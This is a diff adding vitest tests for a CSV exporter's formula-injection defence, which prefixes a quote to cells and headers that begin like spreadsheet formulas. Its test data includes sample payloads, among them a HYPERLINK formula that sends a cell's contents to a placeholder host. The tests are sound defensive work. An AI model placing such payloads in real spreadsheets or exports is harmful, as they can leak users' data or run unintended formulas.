@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest";
-import { CSV_LIMIT, csvEscape, toCsv, type CsvOptions } from "../src/csv.js";
+import { CSV_LIMIT, csvEscape, neutralizeFormula, toCsv, type CsvOptions } from "../src/csv.js";
 import { generateAll } from "../src/generator.js";
-import { COLUMN_IDS, METRIC_COUNT } from "../src/schema.js";
+import { COLUMN_IDS, METRIC_COUNT, METRIC_IDS } from "../src/schema.js";
 import { writeComment } from "../src/store.js";
 import { labels as arLabels, pools as ar } from "../src/pools/ar.js";
 import { labels as enLabels, pools as en } from "../src/pools/en.js";
@@ -93,5 +93,41 @@ describe("csv export", () => {
     const csv = toCsv(s, [0, 1], ["comment"], ruOptions).split("\r\n");
     expect(csv[1]).toBe('"said ""no""; call later"');
     expect(csv[2]).toBe("Правка коллеги 4");
+  });
+
+  it("writes text that starts like a formula as text, so a spreadsheet does not run it", () => {
+    expect(neutralizeFormula("=1+1")).toBe("'=1+1");
+    for (const lead of ["=", "+", "-", "@", "\t", "\r", "\uff1d", "\uff0b", "\uff0d", "\uff20"]) {
+      expect(neutralizeFormula(`${lead}x`)).toBe(`'${lead}x`);
+    }
+    expect(neutralizeFormula("a=b")).toBe("a=b");
+    expect(neutralizeFormula("")).toBe("");
+
+    const s = generateAll(3, 6, 6);
+    const payloads = ['=HYPERLINK("http://example.test/?"&A1,"Open")', "+1", "-2", "@SUM(A1:A9)", "\tcmd", "\rcmd"];
+    payloads.forEach((text, row) => writeComment(s, row, { kind: "text", text }, 0));
+    const lines = toCsv(s, [0, 1, 2, 3, 4, 5], ["comment"], ruOptions).split("\r\n");
+    expect(lines.slice(1)).toEqual([
+      '"\'=HYPERLINK(""http://example.test/?""&A1,""Open"")"',
+      "'+1",
+      "'-2",
+      "'@SUM(A1:A9)",
+      "'\tcmd",
+      '"\'\rcmd"',
+    ]);
+  });
+
+  it("neutralises a formula in a header, but never a number", () => {
+    const s = generateAll(3, 2, 2);
+    s.amount[0] = -1500;
+    s.metrics[0 * METRIC_COUNT + METRIC_IDS.indexOf("marginAbs")] = -42;
+    const csv = toCsv(s, [0], ["amount", "marginAbs", "sla"], {
+      ...ruOptions,
+      headers: { amount: "=cmd", marginAbs: "Margin", sla: "SLA" },
+    }).split("\r\n");
+    expect(csv[0]).toBe("'=cmd;Margin;SLA");
+    expect(csv[1]).toBe(`-1500;-42;${s.sla[0]}`);
+    const formatted = toCsv(s, [0], ["amount"], { ...ruOptions, formatNumber: (n) => n.toFixed(2) }).split("\r\n");
+    expect(formatted[1]).toBe("-1500.00");
   });
 });
